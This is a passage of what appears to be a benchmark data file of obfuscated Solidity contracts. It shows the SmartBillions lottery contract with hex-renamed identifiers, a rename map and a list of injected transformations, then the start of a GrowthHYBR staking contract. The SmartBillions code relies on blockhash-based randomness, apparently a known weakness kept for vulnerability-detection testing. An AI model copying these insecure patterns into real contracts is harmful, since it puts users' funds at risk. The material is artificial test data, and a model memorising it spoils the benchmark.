_0x0d24ff(2 * 32) {\n    _0xff3c06(msg.sender);\n    _0xcfdc8e[msg.sender] = _0xcfdc8e[msg.sender]._0xcc8e14(_0x648ae5);\n    if(_0x24e87d == address(this)) {\n        _0xff3c06(_0x451a50);\n        _0xcfdc8e[_0x451a50] = _0xcfdc8e[_0x451a50]._0x80822b(_0x648ae5);\n        Transfer(msg.sender, _0x451a50, _0x648ae5);\n    }\n    else {\n        _0xff3c06(_0x24e87d);\n        _0xcfdc8e[_0x24e87d] = _0xcfdc8e[_0x24e87d]._0x80822b(_0x648ae5);\n        Transfer(msg.sender, _0x24e87d, _0x648ae5);\n    }\n  }\n\n  function _0xaae355(address _0x26496b) constant returns (uint balance) {\n    return _0xcfdc8e[_0x26496b];\n  }\n}\n\ncontract StandardToken is BasicToken, ERC20 {\n  mapping (address => mapping (address => uint)) _0x6ae1ea;\n\n  function _0x9c0862(address _0x8790e4, address _0x24e87d, uint _0x648ae5) _0x0d24ff(3 * 32) {\n    var _0xcf43e6 = _0x6ae1ea[_0x8790e4][msg.sender];\n    _0xff3c06(_0x8790e4);\n    _0xff3c06(_0x24e87d);\n    _0xcfdc8e[_0x24e87d] = _0xcfdc8e[_0x24e87d]._0x80822b(_0x648ae5);\n    _0xcfdc8e[_0x8790e4] = _0xcfdc8e[_0x8790e4]._0xcc8e14(_0x648ae5);\n    _0x6ae1ea[_0x8790e4][msg.sender] = _0xcf43e6._0xcc8e14(_0x648ae5);\n    Transfer(_0x8790e4, _0x24e87d, _0x648ae5);\n  }\n\n  function _0x61027c(address _0xe4b942, uint _0x648ae5) {\n    //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n    assert(!((_0x648ae5 != 0) && (_0x6ae1ea[msg.sender][_0xe4b942] != 0)));\n    _0x6ae1ea[msg.sender][_0xe4b942] = _0x648ae5;\n    Approval(msg.sender, _0xe4b942, _0x648ae5);\n  }\n\n  function _0xc0dd1d(address _0x26496b, address _0xe4b942) constant returns (uint _0x029b9a) {\n    return _0x6ae1ea[_0x26496b][_0xe4b942];\n  }\n}\n\ncontract SmartBillions is StandardToken {\n\n    // metadata\n    string public constant _0xbde957 = \"SmartBillions Token\";\n    string public constant _0x069445 = \"PLAY\";\n    uint public constant _0x938cb1 = 0;\n\n    // contract state\n    struct Wallet {\n        uint208 balance; // current balance of user\n    \tuint16 _0x4a16b6; // last processed dividend period of user's tokens\n    \tuint32 _0x747824; // next withdrawal possible after this block number\n    }\n    mapping (address => Wallet) _0x51c397;\n    struct Bet {\n        uint192 value; // bet size\n        uint32 _0x980a55; // selected numbers\n        uint32 _0xc1551e; // blocknumber when lottery runs\n    }\n    mapping (address => Bet) _0xad447a;\n\n    uint public _0x95d3bc = 0; // sum of funds in wallets\n\n    // investment parameters\n    uint public _0xc34486 = 1; // investment start block, 0: closed, 1: preparation\n    uint public _0x08848d = 0; // funding from investors\n    uint public _0x709042 = 200000 ether; // maximum funding\n    uint public _0x908f97 = 1;\n    uint[] public _0x1ef71f; // dividens collected per period, growing array\n\n    // betting parameters\n    uint public _0xc05cf1 = 0; // maximum prize won\n    uint public _0xbf01dc = 0; // start time of building hashes database\n    uint public _0x778016 = 0; // last saved block of hashes\n    uint public _0xdd8334 = 0; // next available bet block.number\n    uint public _0x6b9c79 = 0; // used bet volume of next block\n    uint public _0xbf503e = 5 ether; // maximum bet size per block\n    uint[] public _0xad97d8; // space for storing lottery results\n\n    // constants\n    //uint public constant hashesSize = 1024 ; // DEBUG ONLY !!!\n    uint public constant _0x943f01 = 16384 ; // 30 days of blocks\n    uint public _0x6c901f = 0 ; // block of last cold store transfer\n\n    // events\n    event LogBet(address indexed _0x4a2854, uint _0xc5afc3, uint _0xf86432, uint _0xe88822);\n    event LogLoss(address indexed _0x4a2854, uint _0xc5afc3, uint _0xc201e1);\n    event LogWin(address indexed _0x4a2854, uint _0xc5afc3, uint _0xc201e1, uint _0x77f3f1);\n    event LogInvestment(address indexed _0xfd71df, address indexed _0x71d759, uint _0xa2fded);\n    event LogRecordWin(address indexed _0x4a2854, uint _0xa2fded);\n    event LogLate(address indexed _0x4a2854,uint _0xb3907b,uint _0xf9bc43);\n    event LogDividend(address indexed _0xfd71df, uint _0xa2fded, uint _0x415cb7);\n\n    modifier _0xd7b38a() {\n        assert(msg.sender == _0x451a50);\n        _;\n    }\n\n    modifier _0x4f73a6() {\n        assert(msg.sender == _0xa883ae);\n        _;\n    }\n\n    // constructor\n    function SmartBillions() {\n        if (true) { _0x451a50 = msg.sender; }\n        _0xa883ae = msg.sender;\n        _0x51c397[_0x451a50]._0x4a16b6 = uint16(_0x908f97);\n        _0x1ef71f.push(0); // not used\n        _0x1ef71f.push(0); // current dividend\n    }\n\n/* getters */\n\n    function _0xfc78c8() constant external returns (uint) {\n        return uint(_0xad97d8.length);\n    }\n\n    function _0x738713(address _0x26496b) constant external returns (uint) {\n        return uint(_0x51c397[_0x26496b].balance);\n    }\n\n    function _0x3491a3(address _0x26496b) constant external returns (uint) {\n        return uint(_0x51c397[_0x26496b]._0x4a16b6);\n    }\n\n    function _0x68753f(address _0x26496b) constant external returns (uint) {\n        return uint(_0x51c397[_0x26496b]._0x747824);\n    }\n\n    function _0xbda8b4(address _0x26496b) constant external returns (uint) {\n        return uint(_0xad447a[_0x26496b].value);\n    }\n\n    function _0x1aeb5f(address _0x26496b) constant external returns (uint) {\n        return uint(_0xad447a[_0x26496b]._0x980a55);\n    }\n\n    function _0x6f207b(address _0x26496b) constant external returns (uint) {\n        return uint(_0xad447a[_0x26496b]._0xc1551e);\n    }\n\n    function _0xde9a96() constant external returns (uint) {\n        if(_0xc34486 > 0) {\n            return(0);\n        }\n        uint _0x415cb7 = (block.number - _0xbf01dc) / (10 * _0x943f01);\n        if(_0x415cb7 > _0x908f97) {\n            return(0);\n        }\n        return((10 * _0x943f01) - ((block.number - _0xbf01dc) % (10 * _0x943f01)));\n    }\n\n/* administrative functions */\n\n    function _0xc87f4d(address _0x860673) external _0xd7b38a {\n        assert(_0x860673 != address(0));\n        _0xff3c06(msg.sender);\n        _0xff3c06(_0x860673);\n        _0x451a50 = _0x860673;\n    }\n\n    function _0xd676aa(address _0x860673) external _0x4f73a6 {\n        assert(_0x860673 != address(0));\n        _0xff3c06(msg.sender);\n        _0xff3c06(_0x860673);\n        _0xa883ae = _0x860673;\n    }\n\n    function _0x76c305(uint _0x6cee3c) external _0xd7b38a {\n        require(_0xc34486 == 1 && _0xbf01dc > 0 && block.number < _0x6cee3c);\n        _0xc34486 = _0x6cee3c;\n    }\n\n    function _0x53586c(uint _0xe38d5d) external _0xd7b38a {\n        _0xbf503e = _0xe38d5d;\n    }\n\n    function _0x6ae1db() external _0xd7b38a {\n        _0xdd8334 = block.number + 3;\n        if (1 == 1) { _0x6b9c79 = 0; }\n    }\n\n    function _0x038143(uint _0x9dcb82) external _0xd7b38a {\n        _0xaec5f7();\n        require(_0x9dcb82 > 0 && this.balance >= (_0x08848d * 9 / 10) + _0x95d3bc + _0x9dcb82);\n        if(_0x08848d >= _0x709042 / 2){ // additional jackpot protection\n            require((_0x9dcb82 <= this.balance / 400) && _0x6c901f + 4 * 60 * 24 * 7 <= block.number);\n        }\n        msg.sender.transfer(_0x9dcb82);\n        if (gasleft() > 0) { _0x6c901f = block.number; }\n    }\n\n    function _0x544592() payable external {\n        _0xaec5f7();\n    }\n\n/* housekeeping functions */\n\n    function _0xaec5f7() public {\n        if(_0xc34486 > 1 && block.number >= _0xc34486 + (_0x943f01 * 5)){ // ca. 14 days\n            _0xc34486 = 0; // start dividend payments\n        }\n        else {\n            if(_0xbf01dc > 0){\n\t\t        uint _0x415cb7 = (block.number - _0xbf01dc) / (10 * _0x943f01 );\n                if(_0x415cb7 > _0x1ef71f.length - 2) {\n                    _0x1ef71f.push(0);\n                }\n                if(_0x415cb7 > _0x908f97 && _0xc34486 == 0 && _0x908f97 < _0x1ef71f.length - 1) {\n                    _0x908f97++;\n                }\n            }\n        }\n    }\n\n/* payments */\n\n    function _0xc066ec() public {\n        if(_0x51c397[msg.sender].balance > 0 && _0x51c397[msg.sender]._0x747824 <= block.number){\n            uint balance = _0x51c397[msg.sender].balance;\n            _0x51c397[msg.sender].balance = 0;\n            _0x95d3bc -= balance;\n            _0x3c5e69(balance);\n        }\n    }\n\n    function _0x3c5e69(uint _0x9dcb82) private {\n        uint _0x232b0e = this.balance / 2;\n        if(_0x232b0e >= _0x9dcb82) {\n            msg.sender.transfer(_0x9dcb82);\n            if(_0x9dcb82 > 1 finney) {\n                _0xaec5f7();\n            }\n        }\n        else {\n            uint _0xfc800b = _0x9dcb82 - _0x232b0e;\n            _0x95d3bc += _0xfc800b;\n            _0x51c397[msg.sender].balance += uint208(_0xfc800b);\n            _0x51c397[msg.sender]._0x747824 = uint32(block.number + 4 * 60 * 24 * 30); // wait 1 month for more funds\n            msg.sender.transfer(_0x232b0e);\n        }\n    }\n\n/* investment functions */\n\n    function _0x9ddf1a() payable external {\n        _0x2915ab(_0x451a50);\n    }\n\n    function _0x2915ab(address _0xc4d1f3) payable public {\n        //require(fromUSA()==false); // fromUSA() not yet implemented :-(\n        require(_0xc34486 > 1 && block.number < _0xc34486 + (_0x943f01 * 5) && _0x08848d < _0x709042);\n        uint _0x7c1113 = msg.value;\n        if(_0x7c1113 > _0x709042 - _0x08848d) {\n            _0x7c1113 = _0x709042 - _0x08848d;\n            _0x08848d = _0x709042;\n            _0xc34486 = 0; // close investment round\n            msg.sender.transfer(msg.value._0xcc8e14(_0x7c1113)); // send back funds immediately\n        }\n        else{\n            _0x08848d += _0x7c1113;\n        }\n        if(_0xc4d1f3 == address(0) || _0xc4d1f3 == _0x451a50){\n            _0x95d3bc += _0x7c1113 / 10;\n            _0x51c397[_0x451a50].balance += uint208(_0x7c1113 / 10);} // 10% for marketing if no affiliates\n        else{\n            _0x95d3bc += (_0x7c1113 * 5 / 100) * 2;\n            _0x51c397[_0x451a50].balance += uint208(_0x7c1113 * 5 / 100); // 5% initial marketing funds\n            _0x51c397[_0xc4d1f3].balance += uint208(_0x7c1113 * 5 / 100);} // 5% for affiliates\n        _0x51c397[msg.sender]._0x4a16b6 = uint16(_0x908f97); // assert(dividendPeriod == 1);\n        uint _0xb1fc54 = _0x7c1113 / 10**15;\n        uint _0xf660a4 = _0x7c1113 * 16 / 10**17  ;\n        uint _0x0bcf09 = _0x7c1113 * 10 / 10**17  ;\n        _0xcfdc8e[msg.sender] += _0xb1fc54;\n        _0xcfdc8e[_0x451a50] += _0xf660a4 ; // 13% of shares go to developers\n        _0xcfdc8e[_0xa883ae] += _0x0bcf09 ; // 8% of shares go to animator\n        _0x74b165 += _0xb1fc54 + _0xf660a4 + _0x0bcf09;\n        Transfer(address(0),msg.sender,_0xb1fc54); // for etherscan\n        Transfer(address(0),_0x451a50,_0xf660a4); // for etherscan\n        Transfer(address(0),_0xa883ae,_0x0bcf09); // for etherscan\n        LogInvestment(msg.sender,_0xc4d1f3,_0x7c1113);\n    }\n\n    function _0xbb1d34() external {\n        require(_0xc34486 == 0);\n        _0xff3c06(msg.sender);\n        uint _0xc51dea = _0xcfdc8e[msg.sender] * 10**15;\n        Transfer(msg.sender,address(0),_0xcfdc8e[msg.sender]); // for etherscan\n        delete _0xcfdc8e[msg.sender]; // totalSupply stays the same, investBalance is reduced\n        _0x08848d -= _0xc51dea;\n        _0x51c397[msg.sender].balance += uint208(_0xc51dea * 9 / 10);\n        _0xc066ec();\n    }\n\n    function _0x74ad0e() external {\n        require(_0xc34486 == 0);\n        _0xff3c06(msg.sender);\n        _0xc066ec();\n    }\n\n    function _0xff3c06(address _0x860673) internal {\n        uint _0xf09d03 = _0x51c397[_0x860673]._0x4a16b6;\n        if((_0xcfdc8e[_0x860673]==0) || (_0xf09d03==0)){\n            _0x51c397[_0x860673]._0x4a16b6=uint16(_0x908f97);\n            return;\n        }\n        if(_0xf09d03==_0x908f97) {\n            return;\n        }\n        uint _0x41b288 = _0xcfdc8e[_0x860673] * 0xffffffff / _0x74b165;\n        uint balance = 0;\n        for(;_0xf09d03<_0x908f97;_0xf09d03++) {\n            balance += _0x41b288 * _0x1ef71f[_0xf09d03];\n        }\n        balance = (balance / 0xffffffff);\n        _0x95d3bc += balance;\n        _0x51c397[_0x860673].balance += uint208(balance);\n        _0x51c397[_0x860673]._0x4a16b6 = uint16(_0xf09d03);\n        LogDividend(_0x860673,balance,_0xf09d03);\n    }\n\n/* lottery functions */\n\n    function _0x1c483e(Bet _0x09aab2, uint24 _0x5b28a9) constant private returns (uint) { // house fee 13.85%\n        uint24 _0xc5afc3 = uint24(_0x09aab2._0x980a55);\n        uint24 _0x5dd1ff = _0xc5afc3 ^ _0x5b28a9;\n        uint24 _0x944dcb =\n            ((_0x5dd1ff & 0xF) == 0 ? 1 : 0 ) +\n            ((_0x5dd1ff & 0xF0) == 0 ? 1 : 0 ) +\n            ((_0x5dd1ff & 0xF00) == 0 ? 1 : 0 ) +\n            ((_0x5dd1ff & 0xF000) == 0 ? 1 : 0 ) +\n            ((_0x5dd1ff & 0xF0000) == 0 ? 1 : 0 ) +\n            ((_0x5dd1ff & 0xF00000) == 0 ? 1 : 0 );\n        if(_0x944dcb == 6){\n            return(uint(_0x09aab2.value) * 7000000);\n        }\n        if(_0x944dcb == 5){\n            return(uint(_0x09aab2.value) * 20000);\n        }\n        if(_0x944dcb == 4){\n            return(uint(_0x09aab2.value) * 500);\n        }\n        if(_0x944dcb == 3){\n            return(uint(_0x09aab2.value) * 25);\n        }\n        if(_0x944dcb == 2){\n            return(uint(_0x09aab2.value) * 3);\n        }\n        return(0);\n    }\n\n    function _0xc14550(address _0x860673) constant external returns (uint)  {\n        Bet memory _0x4a2854 = _0xad447a[_0x860673];\n        if( (_0x4a2854.value==0) ||\n            (_0x4a2854._0xc1551e<=1) ||\n            (block.number<_0x4a2854._0xc1551e) ||\n            (block.number>=_0x4a2854._0xc1551e + (10 * _0x943f01))){\n            return(0);\n        }\n        if(block.number<_0x4a2854._0xc1551e+256){\n            return(_0x1c483e(_0x4a2854,uint24(block.blockhash(_0x4a2854._0xc1551e))));\n        }\n        if(_0xbf01dc>0){\n            uint32 _0xc201e1 = _0x3cd11a(_0x4a2854._0xc1551e);\n            if(_0xc201e1 == 0x1000000) { // load hash failed :-(, return funds\n                return(uint(_0x4a2854.value));\n            }\n            else{\n                return(_0x1c483e(_0x4a2854,uint24(_0xc201e1)));\n            }\n\t}\n        return(0);\n    }\n\n    function _0x7e02bd() public {\n        Bet memory _0x4a2854 = _0xad447a[msg.sender];\n        if(_0x4a2854._0xc1551e==0){ // create a new player\n            _0xad447a[msg.sender] = Bet({value: 0, _0x980a55: 0, _0xc1551e: 1});\n            return;\n        }\n        if((_0x4a2854.value==0) || (_0x4a2854._0xc1551e==1)){\n            _0xc066ec();\n            return;\n        }\n        require(block.number>_0x4a2854._0xc1551e); // if there is an active bet, throw()\n        if(_0x4a2854._0xc1551e + (10 * _0x943f01) <= block.number){ // last bet too long ago, lost !\n            LogLate(msg.sender,_0x4a2854._0xc1551e,block.number);\n            _0xad447a[msg.sender] = Bet({value: 0, _0x980a55: 0, _0xc1551e: 1});\n            return;\n        }\n        uint _0x77f3f1 = 0;\n        uint32 _0xc201e1 = 0;\n        if(block.number<_0x4a2854._0xc1551e+256){\n            _0xc201e1 = uint24(block.blockhash(_0x4a2854._0xc1551e));\n            _0x77f3f1 = _0x1c483e(_0x4a2854,uint24(_0xc201e1));\n        }\n        else {\n            if(_0xbf01dc>0){ // lottery is open even before swap space (hashes) is ready, but player must collect results within 256 blocks after run\n                _0xc201e1 = _0x3cd11a(_0x4a2854._0xc1551e);\n                if(_0xc201e1 == 0x1000000) { // load hash failed :-(, return funds\n                    _0x77f3f1 = uint(_0x4a2854.value);\n                }\n                else{\n                    _0x77f3f1 = _0x1c483e(_0x4a2854,uint24(_0xc201e1));\n                }\n\t    }\n            else{\n                LogLate(msg.sender,_0x4a2854._0xc1551e,block.number);\n                _0xad447a[msg.sender] = Bet({value: 0, _0x980a55: 0, _0xc1551e: 1});\n                return();\n            }\n        }\n        _0xad447a[msg.sender] = Bet({value: 0, _0x980a55: 0, _0xc1551e: 1});\n        if(_0x77f3f1>0) {\n            LogWin(msg.sender,uint(_0x4a2854._0x980a55),uint(_0xc201e1),_0x77f3f1);\n            if(_0x77f3f1 > _0xc05cf1){\n                _0xc05cf1 = _0x77f3f1;\n                LogRecordWin(msg.sender,_0x77f3f1);\n            }\n            _0x3c5e69(_0x77f3f1);\n        }\n        else{\n            LogLoss(msg.sender,uint(_0x4a2854._0x980a55),uint(_0xc201e1));\n        }\n    }\n\n    function () payable external {\n        if(msg.value > 0){\n            if(_0xc34486>1){ // during ICO payment to the contract is treated as investment\n                _0x2915ab(_0x451a50);\n            }\n            else{ // if not ICO running payment to contract is treated as play\n                _0xdb4057();\n            }\n            return;\n        }\n        //check for dividends and other assets\n        if(_0xc34486 == 0 && _0xcfdc8e[msg.sender]>0){\n            _0xff3c06(msg.sender);}\n        _0x7e02bd(); // will run payWallet() if nothing else available\n    }\n\n    function _0xdb4057() payable public returns (uint) {\n        return _0xf44267(uint(_0xb1d04c(msg.sender,block.number)), address(0));\n    }\n\n    function _0x188e04(address _0xc4d1f3) payable public returns (uint) {\n        return _0xf44267(uint(_0xb1d04c(msg.sender,block.number)), _0xc4d1f3);\n    }\n\n    function _0xf44267(uint _0x5b28a9, address _0xc4d1f3) payable public returns (uint) {\n        _0x7e02bd(); // check if player did not win\n        uint24 _0xc5afc3 = uint24(_0x5b28a9);\n        require(msg.value <= 1 ether && msg.value < _0xbf503e);\n        if(msg.value > 0){\n            if(_0xc34486==0) { // dividends only after investment finished\n                _0x1ef71f[_0x908f97] += msg.value / 20; // 5% dividend\n            }\n            if(_0xc4d1f3 != address(0)) {\n                uint _0x1be4e1 = msg.value / 100;\n                _0x95d3bc += _0x1be4e1;\n                _0x51c397[_0xc4d1f3].balance += uint208(_0x1be4e1); // 1% for affiliates\n            }\n            if(_0xdd8334 < block.number + 3) {\n                _0xdd8334 = block.number + 3;\n                if (msg.sender != address(0) || msg.sender == address(0)) { _0x6b9c79 = msg.value; }\n            }\n            else{\n                if(_0x6b9c79 > _0xbf503e) {\n                    _0xdd8334++;\n                    _0x6b9c79 = msg.value;\n                }\n                else{\n                    _0x6b9c79 += msg.value;\n                }\n            }\n            _0xad447a[msg.sender] = Bet({value: uint192(msg.value), _0x980a55: uint32(_0xc5afc3), _0xc1551e: uint32(_0xdd8334)});\n            LogBet(msg.sender,uint(_0xc5afc3),_0xdd8334,msg.value);\n        }\n        _0x1cdbd4(); // players help collecing data\n        return(_0xdd8334);\n    }\n\n/* database functions */\n\n    function _0x2eb3c8(uint _0x7680e1) public returns (uint) {\n        require(_0xbf01dc == 0 && _0x7680e1 > 0 && _0x7680e1 <= _0x943f01);\n        uint n = _0xad97d8.length;\n        if(n + _0x7680e1 > _0x943f01){\n            _0xad97d8.length = _0x943f01;\n        }\n        else{\n            _0xad97d8.length += _0x7680e1;\n        }\n        for(;n<_0xad97d8.length;n++){ // make sure to burn gas\n            _0xad97d8[n] = 1;\n        }\n        if(_0xad97d8.length>=_0x943f01) { // assume block.number > 10\n            if (msg.sender != address(0) || msg.sender == address(0)) { _0xbf01dc = block.number - ( block.number % 10); }\n            _0x778016 = _0xbf01dc;\n        }\n        return(_0xad97d8.length);\n    }\n\n    function _0xda3ab6() external returns (uint) {\n        return(_0x2eb3c8(128));\n    }\n\n    function _0x501ea2(uint32 _0xce9734, uint32 _0x686638) constant private returns (uint) {\n        return( ( uint(block.blockhash(_0xce9734  )) & 0xFFFFFF )\n            | ( ( uint(block.blockhash(_0xce9734+1)) & 0xFFFFFF ) << 24 )\n            | ( ( uint(block.blockhash(_0xce9734+2)) & 0xFFFFFF ) << 48 )\n            | ( ( uint(block.blockhash(_0xce9734+3)) & 0xFFFFFF ) << 72 )\n            | ( ( uint(block.blockhash(_0xce9734+4)) & 0xFFFFFF ) << 96 )\n            | ( ( uint(block.blockhash(_0xce9734+5)) & 0xFFFFFF ) << 120 )\n            | ( ( uint(block.blockhash(_0xce9734+6)) & 0xFFFFFF ) << 144 )\n            | ( ( uint(block.blockhash(_0xce9734+7)) & 0xFFFFFF ) << 168 )\n            | ( ( uint(block.blockhash(_0xce9734+8)) & 0xFFFFFF ) << 192 )\n            | ( ( uint(block.blockhash(_0xce9734+9)) & 0xFFFFFF ) << 216 )\n            | ( ( uint(_0x686638) / _0x943f01) << 240));\n    }\n\n    function _0x3cd11a(uint _0x53ab04) constant private returns (uint32) {\n        uint _0x952789 = (_0x53ab04 - _0xbf01dc) / 10;\n        uint _0xc201e1 = _0xad97d8[_0x952789 % _0x943f01];\n        if(_0x952789 / _0x943f01 != _0xc201e1 >> 240) {\n            return(0x1000000); // load failed, incorrect data in hashes\n        }\n        uint _0xcd90e9 = (_0x53ab04 - _0xbf01dc) % 10;\n        return(uint32((_0xc201e1 >> (24 * _0xcd90e9)) & 0xFFFFFF));\n    }\n\n    function _0x1cdbd4() public returns (bool) {\n        uint _0xf8111c = _0x778016;\n        if(_0xf8111c == 0 || block.number <= _0xf8111c + 10) {\n            return(false);\n        }\n        uint _0x746443;\n        if(block.number<256) { // useless test for testnet :-(\n            _0x746443 = 0;\n        }\n        else{\n            if (1 == 1) { _0x746443 = block.number - 256; }\n        }\n        if(_0xf8111c < _0x746443) {\n            uint _0xe679c9 = _0x746443;\n            _0xe679c9 += _0xe679c9 % 10;\n            _0xf8111c = _0xe679c9;\n        }\n        uint _0x952789 = (_0xf8111c - _0xbf01dc) / 10;\n        _0xad97d8[_0x952789 % _0x943f01] = _0x501ea2(uint32(_0xf8111c),uint32(_0x952789));\n        _0x778016 = _0xf8111c + 10;\n        return(true);\n    }\n\n    function _0xd179e0(uint _0x3538d4) external {\n        uint n=0;\n        for(;n<_0x3538d4;n++){\n            if(!_0x1cdbd4()){\n                return;\n            }\n        }\n    }\n\n}",
      "rename_map": {
        "currentBlockNumber": "_0xf9bc43",
        "lastDividendPeriod": "_0x4a16b6",
        "initialInvestment": "_0xc51dea",
        "playerBlockNumber": "_0xb3907b",
        "nextWithdrawBlock": "_0x747824",
        "investBalanceMax": "_0x709042",
        "betBlockNumberOf": "_0x6f207b",
        "dividendsBlocks": "_0xde9a96",
        "walletBalanceOf": "_0x738713",
        "onlyPayloadSize": "_0x0d24ff",
        "animatorBalance": "_0x0bcf09",
        "changeAnimator": "_0xd676aa",
        "dividendPeriod": "_0x908f97",
        "setInvestStart": "_0x76c305",
        "commitDividend": "_0xff3c06",
        "walletPeriodOf": "_0x3491a3",
        "senderBalance": "_0xb1fc54",
        "walletBlockOf": "_0x68753f",
        "coldStoreLast": "_0x6c901f",
        "walletBalance": "_0x95d3bc",
        "investBalance": "_0x08848d",
        "transferFrom": "_0x9c0862",
        "houseKeeping": "_0xaec5f7",
        "onlyAnimator": "_0x4f73a6",
        "hashesLength": "_0xfc78c8",
        "payDividends": "_0x74ad0e",
        "investDirect": "_0x9ddf1a",
        "addHashes128": "_0xda3ab6",
        "ownerBalance": "_0xf660a4",
        "blocknumber": "_0xf86432",
        "investStart": "_0xc34486",
        "totalSupply": "_0x74b165",
        "changeOwner": "_0xc87f4d",
        "keepbalance": "_0xfc800b",
        "hashesSize": "_0x943f01",
        "hashBetMax": "_0xbf503e",
        "betValueOf": "_0xbda8b4",
        "calcHashes": "_0x501ea2",
        "_allowance": "_0xcf43e6",
        "hashBetSum": "_0x6b9c79",
        "playSystem": "_0xf44267",
        "playRandom": "_0x188e04",
        "hashFirst": "_0xbf01dc",
        "onlyOwner": "_0xd7b38a",
        "payWallet": "_0xc066ec",
        "balanceOf": "_0xaae355",
        "blockn256": "_0x746443",
        "addHashes": "_0x2eb3c8",
        "betHashOf": "_0x1aeb5f",
        "putHashes": "_0xd179e0",
        "allowance": "_0xc0dd1d",
        "disinvest": "_0xbb1d34",
        "setBetMax": "_0x53586c",
        "dividends": "_0x1ef71f",
        "coldStore": "_0x038143",
        "remaining": "_0x029b9a",
        "investing": "_0x7c1113",
        "hashNext": "_0xdd8334",
        "decimals": "_0x938cb1",
        "investor": "_0xfd71df",
        "blockNum": "_0xc1551e",
        "_partner": "_0xc4d1f3",
        "hotStore": "_0x544592",
        "_spender": "_0xe4b942",
        "betPrize": "_0x1c483e",
        "hashLast": "_0x778016",
        "resetBet": "_0x6ae1db",
        "animator": "_0xa883ae",
        "balances": "_0xcfdc8e",
        "bethash": "_0xc5afc3",
        "matches": "_0x944dcb",
        "partner": "_0x71d759",
        "allowed": "_0x6ae1ea",
        "betHash": "_0x980a55",
        "approve": "_0x61027c",
        "_player": "_0x09aab2",
        "wallets": "_0x51c397",
        "betsize": "_0xe88822",
        "putHash": "_0x1cdbd4",
        "_amount": "_0x9dcb82",
        "spender": "_0xb1834b",
        "_maxsum": "_0xe38d5d",
        "getHash": "_0x3cd11a",
        "period": "_0x415cb7",
        "invest": "_0x2915ab",
        "_owner": "_0x26496b",
        "hashes": "_0xad97d8",
        "_lastb": "_0xce9734",
        "amount": "_0xa2fded",
        "maxWin": "_0xc05cf1",
        "player": "_0x4a2854",
        "_value": "_0x648ae5",
        "symbol": "_0x069445",
        "_block": "_0x53ab04",
        "maxpay": "_0x232b0e",
        "_delta": "_0x686638",
        "_sadd": "_0x7680e1",
        "_hash": "_0x5b28a9",
        "_when": "_0x6cee3c",
        "share": "_0x41b288",
        "lastb": "_0xf8111c",
        "delta": "_0x952789",
        "slotp": "_0xcd90e9",
        "prize": "_0x77f3f1",
        "betOf": "_0xc14550",
        "_from": "_0x8790e4",
        "owner": "_0x451a50",
        "size": "_0xa99a50",
        "bets": "_0xad447a",
        "sha3": "_0xb1d04c",
        "hash": "_0xc201e1",
        "_who": "_0x860673",
        "_num": "_0x3538d4",
        "last": "_0xf09d03",
        "name": "_0xbde957",
        "play": "_0xdb4057",
        "fee": "_0x1be4e1",
        "_to": "_0x24e87d",
        "hit": "_0x5dd1ff",
        "who": "_0x773db9",
        "pay": "_0x3c5e69",
        "num": "_0xe679c9",
        "won": "_0x7e02bd",
        "add": "_0x80822b",
        "sub": "_0xcc8e14",
        "to": "_0x913c99"
      },
      "changes": [
        "Renamed 126 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_gs_001",
      "transformed_id": "ss_l4_medium_sn_gs_001",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"./interfaces/IVotingEscrow.sol\";\nimport \"./interfaces/IVoter.sol\";\nimport \"./interfaces/IBribe.sol\";\nimport \"./interfaces/IRewardsDistributor.sol\";\nimport \"./interfaces/IGaugeManager.sol\";\nimport \"./interfaces/ISwapper.sol\";\nimport {HybraTimeLibrary} from \"./libraries/HybraTimeLibrary.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n\n/**\n * @title GovernanceHYBR (gHYBR)\n * @notice Auto-compounding staking token that locks HYBR as veHYBR and compounds rewards\n * @dev Implements transfer restrictions for new deposits and automatic reward compounding\n */\ncontract GrowthHYBR is ERC20, Ownable, ReentrancyGuard {\n    using SafeERC20 for IERC20;\n    // Lock period for new deposits (configurable between 12-24 hours)\n    uint256 public _0xf5009e = 24 hours;\n    uint256 public constant MIN_LOCK_PERIOD = 1 minutes;\n    uint256 public constant MAX_LOCK_PERIOD = 240 minutes;\n    uint256 public _0x4447b0 = 1200; // 5days\n    uint256 public _0xfea910 = 300; // 1day\n\n    // Withdraw fee configuration (basis points, 10000 = 100%)\n    uint256 public _0x59137c = 100; // 1% default fee\n    uint256 public constant MIN_WITHDRAW_FEE = 10; // 0.1% minimum\n    uint256 public constant MAX_WITHDRAW_FEE = 1000; // 10% maximum\n    uint256 public constant BASIS = 10000;\n    address public Team; // Address to receive fees\n    uint256 public _0x524a0f;\n    uint256 public _0xc7ce62;\n    uint256 public _0x180b9f;\n    // User deposit tracking for transfer locks\n    struct UserLock {\n        uint256 _0xc9a9d4;\n        uint256 _0x4e608e;\n    }\n\n    mapping(address => UserLock[]) public _0x2b4298;\n    mapping(address => uint256) public _0xd4de7b;\n\n    // Core contracts\n    address public immutable HYBR;\n    address public immutable _0xbaecfc;\n    address public _0x24116f;\n    address public _0x67bef5;\n    address public _0x77b462;\n    uint256 public _0x69621a; // The veNFT owned by this contract\n\n    // Auto-voting strategy\n    address public _0xeb35c7; // Address that can manage voting strategy\n    uint256 public _0x7ccd7c; // Last epoch when we voted\n\n    // Reward tracking\n    uint256 public _0xf97bb8;\n    uint256 public _0xeaac9b;\n\n    // Swap module\n    ISwapper public _0x519653;\n\n    // Errors\n    error NOT_AUTHORIZED();\n\n    // Events\n    event Deposit(address indexed _0x2d93cd, uint256 _0x21ddc2, uint256 _0x5b03fa);\n    event Withdraw(address indexed _0x2d93cd, uint256 _0x709ac9, uint256 _0x21ddc2, uint256 _0xa0b006);\n    event Compound(uint256 _0x5fa7c8, uint256 _0xc881a1);\n    event PenaltyRewardReceived(uint256 _0xc9a9d4);\n    event TransferLockPeriodUpdated(uint256 _0xc21160, uint256 _0xfb9baa);\n    event SwapperUpdated(address indexed _0x349373, address indexed _0xc7335c);\n    event 